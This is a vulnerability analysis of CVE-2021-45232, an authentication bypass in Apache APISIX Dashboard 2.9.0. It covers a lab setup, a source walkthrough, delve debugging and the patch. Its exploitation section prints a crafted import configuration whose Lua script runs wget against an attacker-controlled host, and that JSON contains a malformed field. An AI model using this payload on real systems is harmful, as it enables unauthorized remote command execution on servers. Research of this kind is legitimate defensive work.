# **Introduction**

Apache `APISIX` Dashboard before `2.10.1` is vulnerable to Unauthorized Access Vulnerability known as `CVE-2021-45232`, The authentication middleware was developed based on the `droplet` framework. But, some `APIs` used the `gin` framework directly as a results it leads for a bypass in authentication & a successfully exploitation for this vulnerability let the attacker to abuse the support of executing `lua` script to execute commands on the server.

# **What is APISIX ?**

Apache `APISIX` is a cloud native API gateway that provides high-performance and scalable API management solutions. It is built on top of the `Nginx` web server and provides a simple and flexible architecture for managing and securing APIs. The `APISIX` Dashboard is a web based user interface for managing and monitoring `APISIX` instances. It provides an intuitive and easy-to-use interface for configuring `APIs`, `plugins`, and `routes`, as well as monitoring API usage and performance.

# **Testing Lab**

Now, It's time to set up our lab for the analysis, I am going to use an older version for the analysis which is `2.9.0` as it's vulnerable. We can see that apache has an official repo on `github` to run `APISIX` on `docker` and here we can avoid building errors and problems. First, Clone into the repo:

```
git clone https://github.com/apache/apisix-docker
```

After that, Navigate to `example` folder inside `apisix-docker` folder. Then, Open the `docker-compose.yml` file and replace the `apisix-dashboard` image with the following image:

```
apache/apisix-dashboard:2.9.0
```

Full example :

```
version: "3"

services:
  apisix-dashboard:
    image: apache/apisix-dashboard:2.9.0
    restart: always
    volumes:
    - ./dashboard_conf/conf.yaml:/usr/local/apisix-dashboard/conf/conf.yaml
    ports:
    - "9000:9000"
    networks:
      apisix:
```

After that inside the `example` folder run the following command to start our `apisix` on docker:

```
docker-compose -p docker-apisix up -d
```

![](/assets/images/505ef4cc887a271356a6fddf0f68ed20)

As it's done let's check the running `process` on `docker`:

![](/assets/images/3636cc82b4dc0bbd5807ffe1568d6b2b)

Now, Let's test if it works `[IP]:9000/` for the `APISIX` dashboard & `[IP]:9080/` for the `APISIX`.

- Dashboard

- APISIX
    
    ![](/assets/images/b7f32e78ee470c29efd891b0935dfb14)

# **Static Analysis**

Under the `api` folder in the source code, We can see the `main.go` which is the start of the `dashboard` app, By opening it we can see the following:

![](/assets/images/919daf1cf398f86df286bb6908a18f7e)

We can notice here it's importing the `cmd` module from the `manager-api` package which is the `cmd` folder under the same folder, Then, It calls `Execute()` function from `cmd`. Therefore, We need to go to the `cmd` folder and check the `Execute()` function.

![](/assets/images/b5598fa05e34465bd7a12cc962d0c10d)

After going through the files we can see the `Execute()` function is in `root.go`. And basically, It's executing `rootCmd.Execute()` and check if there is any errors returned to handle it. When we search for the `rootCmd`.

![](/assets/images/ac8e582bbdc8df5ed1b53e61f1d92916)

We can see clearly that `rootCmd` is a variable definition of a `CLI` from `Cobra` library which is a command-line library for `Go` and It provides a simple & efficient way to create modern `CLI` applications that can handle commands, flags, and arguments. The `&cobra.Command` function creates a new command with the specified options as the following:

- `Use`: It's a field specifies the name and usage of the command.
    
- `Short`: It's a field that provides a brief description of the command.
    
- `RunE`: it's field of a function that gets called when the command is executed, In our case the function it takes argument and gonna execute the `manageAPI()` function.
    

When we scroll down more under the `Init()` function, We can see the following lines:

![](/assets/images/d73c3c0987eb3bbb544b8803d16a07b4)

We can see it's adding persistent flags to the `rootCmd` and registering several sub-commands (`Also can called functions`) with it as the following:

- `newVersionCommand()`: which adds a `version` sub-command
    
- `newInstallCommand()`: which adds an `install` sub-command
    
- `newRemoveCommand()`: which adds a `remove` sub-command
    
- `newStartCommand()`: which adds a `start` sub-command
    
- `newStopCommand()`: which adds a `stop` sub-command
    
- `newStatusCommand()`: which adds a `status` sub-command
    

And all of these added sub-commands are added from the files under the same directory as we can see:

![](/assets/images/b72368eead4b8ffbec827a02ed7b5b0d)

Now, Let's go to the function that gets executed when we running the `rootCmd` which is the `manageAPI()` function:

![](/assets/images/39010f6d836a4ff7f6ef30e358161bb5)

Now, Let's explain the function. First, it initializes the configuration and logger by calling the `conf.InitConf()` and `log.InitLogger()` functions. Then, it creates a new `server` object using the `server.NewServer()` function and assign it to the `s` variable which is a `server` type and `err` variable for `error` & passing in options that include whether to force start the server or not. After that, The server is then started by calling the `s.Start()` function, which creates a `go routine` and listens for incoming `HTTP` requests and then sets up a quit channel that listens for an interrupt signal and if received, it stops the server gracefully by calling the `s.Stop()` function and exits the program & If an error occurs during server startup the function logs the error and returns it. Now, When we go up to the imports line we can notice the following:

![](/assets/images/7f6769d5fe6947573733e3d7c37169bf)

That the `server` is implemented from `api/internal/core/server/server.go`. Let's take a look on it:

![](/assets/images/dca4cbab50da6e4e7a47c25857420937)

After the `imports` of needed modules, we can see it defines a `struct` of `server` type and it defines the `HTTP` server and its associated options. Then, The `Options` struct is used to specify the configuration options for the server. After that a function named `NewServer` that creates a new server manager by taking an instance of the `Options` struct as input and return a pointer to a server struct and an error.

![](/assets/images/fcc23ab44efddcd0c705ed2415a2f41e)

In the following lines, We can see the `Start()` function that called before inside the `mangerAPI()` function.

![](/assets/images/3038e7890589e1701dc3707d3caa8b38)

the `Start()` function starts with initializing the server through `s.init()` and assign the error to `err` object & if there is an error it will immediately assign it to `errSig` and exit. Now, After the server initialized it will print server info using `s.printInfo()`, Then starts the `HTTP` server through `s.server.ListenAndServe()` & Then it will start the `HTTP` Server implemented with the `SSL` if it's configured. Moving to the following lines we will be able to see the following 2 functions:

![](/assets/images/7c82758e4ef67c793b78bcb625ff6c0a)

First, Which is `Stop()` function and basically it will close the opened connections & then shutdown the server. And second, `init()` function which is important for us, In the function it calls `s.SetupStore()` which is responsible for managing data persistence for the Manager API and it can be found in `store.go` file under the same folder and it's just initializing the `Store`. Second, the `init()` function also calls the `s.setupAPI()` and we can find the `setupAPI()` function inside the `http.go` file under the same folder:

![](/assets/images/e9f7e9aa1636c4f5d0f1b4848c78b618)

Here the `droplet` framework is used, `droplet.Option.Orchestrator` function takes a slice of middleware and returns a new slice of middleware that will be used in the order specified. the first middleware in the slice of middleware passed in. Then the `handler.ErrorTransformMiddleware{}` middleware that transforms all errors returned by handlers to the standard API error format. Finally, the `filter.AuthenticationMiddleware{}` middleware that authenticates requests based on the access token in the `Authorization` header. and by defining the middleware in this way, it ensures that error transformation and authentication will be performed before any other middleware processing. So, for the following examples we gonna see how the wrong implementation done:

- 1st:
    
    ![](/assets/images/ee61b72beb2cd7765cfd947ed04c98ac)
- 2nd:
    
    ![](/assets/images/833ff9b6cb5dfe2956b4d3c11ce692d4)

In the `1st` screenshot we can see that it's `wgin.Wraps()` to wrap the function with the `middleware` so it can it check that error transformation and authentication will be performed before any other middleware processing. But, In the second screenshot it's not wrapping the function with the middleware. As a result we can get unauthorized access to these 2 routes which are `/apisix/admin/migrate/export` & `/apisix/admin/migrate/import`. Let's try to access a route from the wrapped ones and access the non-wrapped ones to se how the application will deal with it.

- Wrapped
    
    ![](/assets/images/49d985af57ef25c7e1d39fda70fb9d3c)
- Non-Wrapped
    
    ![](/assets/images/7af5108642d39a96b9befec5c25323de)

Here we can see clearly that the `wrapped` one give us a response that we are unauthorized. BUt, the second one which is `/apisix/admin/migrate/export` route exported us the current configuration of `APISIX`.

# **Dynamic Analysis**

Now, It's time for dynamic analysis. First, for debugging go applications we need to download `delve` debugger. You can follow the installation guide from [here](https://github.com/go-delve/delve/tree/master/Documentation/installation). Let's now build the dashboard on our local machine to debug it. First we would need the following packages before we start building `golang-go`, `yarn`, `nodejs`, `etcd`:

```
sudo apt install golang-go yarn nodejs
```

And for installing `ectd` follow the installation guide from [here](https://etcd.io/docs/v3.4/install/). After the packages get installed let's download our vulnerable version:

```
git clone -b release/2.9.0 https://github.com/apache/apisix-dashboard.git && cd apisix-dashboard
```

After that run the following command `sudo make build` to build the app dashboard. After it's finished Let's go to `output` directory:

![](/assets/images/1d4a5b17b39d368d99530b849c1164eb)

We can see the `manager-api` which is the dashboard app. Now, It's time to execute the app using `delve` to debug it remote;y from our `GoLand` IDE. You can find `delve` binary under the `go/bin` directory under your linux user home. Let's run `delve`:

```
sudo /home/kali/go/bin/dlv -l=:2345 --headless=true --api-version=2 --log=true exec ./manager-api
```

Here we run `delve` to execute the app and listen for debugging session on port `2345` as we can see:

![](/assets/images/35ba9a7d00ae4960f26b704dc17e141b)

Now, Let's connect to the debugger session on our IDE, go to `Run` Tab and then click on `Edit Configurations`:

![](/assets/images/b806b473d338278a5467104a2d2b5a12)

Then Click on the `+` add sign and choose `Go Remote`:

![](/assets/images/3a950243e6c9972efc1b1923b3573d96)

And Name it as you want & configure the remote debugger, By adding the machine `IP`, Debugging port which is `2345`:

![](/assets/images/507eceecac814bd034b0bd574afab99d)

Now, Click on `OK` and you can see that our remote debugger is configured:

![](/assets/images/92b32a966604ab4b45f24cc05f9934a8)

It's time to set a breakpoints, First we will set a breakpoint to the `wrapped` route and take a look how the app deal with it & then the `un-wrapped` one to see the difference.

![](/assets/images/d3e4540d9879c8f4b8267b84db3f7c29)

As we can see our debugger is running, Let's debug our code and see how it will apply route for each one. While we stepping over under the `r` which is a pointer for `route` we can see `tress` which is `gin.methoidTrees`:

![](/assets/images/43c916f9b6ec027a82587de336522fdd)

Under it we can see integer values and each number is carrying all the different routes according to the methods

![](/assets/images/c9b66831e2f7feb2cb4e28eac50de5cc)

Here we can see see that each the 5 `HTTP` methods are exist and under the `root` of each one, We can see the `children` tab which contains the exact routes:

![](/assets/images/8a209c5e59830ae857724d09e58f9302)

Here we can see the routes also stored inside it. Now, As we saw the way of `ApplyRoute` and how it's applying routes to initialize it, Let's see how the difference between the `wrapped` route and `un-wrapped` route on the loading. But, This time we will add the breakpoint under the `Wrap` function from the `gin` framework:

![](/assets/images/dfde035d844b316319a55d10d2c07c8c)

After setting our breakpoint let's run our debugger again and moving step by step until we arrive to the `Wrap` function.

![](/assets/images/43fcdcb967ecfcbbb3e0034c6fb4072c)

Here as we can see when the breakpoint of the `Wraps` funtion got hit it started to `Wraps` it and apply the middleware to it and as the following 2 routes are not `Wrapped` the authentication can be bypassed as it's gonna apply and execute it without `wrapping`:

```
r.GET("/apisix/admin/migrate/export", h.ExportConfig)
r.POST("/apisix/admin/migrate/import", h.ImportConfig)
```

# **Exploitation**

Now, How the vulnerable routes can be exploited ?. As we mentioned before that the `/apisix/admin/migrate/export` used to export the current configurations, The `/apisix/admin/migrate/import` used to import configurations. And `APISIX` is supporting execution of `lua` scripts then, we can send a request of a malicious route that executes a command then request it. The configuration file is as the following:

![](/assets/images/cc29035b024f7a8d1bb2ed6271cb62f0)

It contains an array of routes, each with an `ID`, `URIs`, `methods`, and a `Lua` script. Additionally, there is an array of `upstreams`, each with a `name`, `type`, `scheme`, `nodes`, and `timeout`. Also arrays for `consumers`, `services`, SSLs, `global plugins`, and `plugin configs`. Now, Let's get our malicious configration ready:

```
{"Counsumers":[],"Routes":[{"id":"387796883096994503","create_time":1640674554,"update_time":1640677637,"uris":["/rce"],"name":"rce","methods":["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS","CONNECT","TRACE"],"script":"os.execute('wget http://172.16.69.246:8000/Pwn3d')","script_id":"387796883096994503","upstream_id":"387796832866009799","status":1}],"Services":[],"SSLs":[],"Upstreams":[{"id":"387796832866009799","create_time":1640674524,"update_time":1640674524,"nodes":[{"host":"localhost","1337":,"weight":1}],"timeout":{"connect":6,"read":6,"send":6},"type":"roundrobin","scheme":"http","pass_host":"pass","name":"testUpstream"}],"GlobalPlugins":[],"PluginConfigs":[]}
```

Basically, Here we set a route named `/rce` and it accepts all `HTTP` methods & Then, Under the `script` key we put the `lua` script as a command system to be executed, In this case it's gonna request our the `Pwn3d` endpoint from our http server.

Normal Request:

And now let's try to execute or code and check it out:

# **Patch Diffing**

Now, Let's take a look at the patch that used to prevent the vulnerability, We can see the patch information on `github`from [here](https://github.com/apache/apisix-dashboard/commit/b565f7cd090e9ee2043fbb726fbaae01737f83cd?diff=split). The changes applied to a lot of files, So we will be focusing on the important ones.

### api/internal/core/server/http.go

![](/assets/images/ba6d3e7b54e1a5925538c309575d92a5)

The `AuthenticationMiddleware` middleware from the filter package was removed and the `ErrorTransformMiddleware` middleware from the handler package was added as the `ErrorTransformMiddleware` middleware from the handler package may be more suitable for catching errors.

### api/internal/filter/authentication.go

![](/assets/images/89e51847d4119b187e61c8dc1a39138d)

Here we can see the new implementation uses `gin.Context` instead of `droplet.Context` and basically, it's refactoring the `AuthenticationMiddleware` into a `gin.HandlerFunc` function. The changes done as the following,The `BaseMiddleware` is no longer used ansd replaced with `gin` to handle the middleware stack, Then `Handle()` method is replaced with a function which returns a `gin.HandlerFunc` to `Authentication()`. `httpReq := ctx.Get(middleware.KeyHttpRequest)` and `req := httpReq.(*http.Request)` replaced with `c.Request`. So, instead of retrieving the request object from the `droplet.Context` using `ctx.Get(middleware.KeyHttpRequest)` and `httpReq.(*http.Request)`, the `http.Request` object is directly retrieved from the `gin.Context` object using `c.Request`. Also, the response object is replaced with a `gin.H` object which is a shorthand for creating `JSON` responses.Finally, the `AbortWithStatusJSON()` method is used to return the response with an `HTTP` status code.

### api/internal/route.go

Here this change is to add authentication to the `gin` application. By inserting the `filter.Authentication()` middleware into the middleware chain and the application will first check if the user is authenticated before allowing them to access protected routes. If the user is not authenticated, they will receive an unauthorized response. If the user is authenticated, the middleware chain will continue to execute and the request will be handled normally.

Finally, The other changes is for test cases like `upstream`, `route` and so on.

# **Conclusion**

We analyzed the the vulnerability and highlited the root cause of it, We show it dynamically how the routes get initialized and Also how the wrapped ones get wrapped by the `Wraps()` function to apply the middleware for it, And how the issue was caused by using the `gin` framework directly without Wrapping it when handling the routes of the configurations and finally, achieving RCE from it.
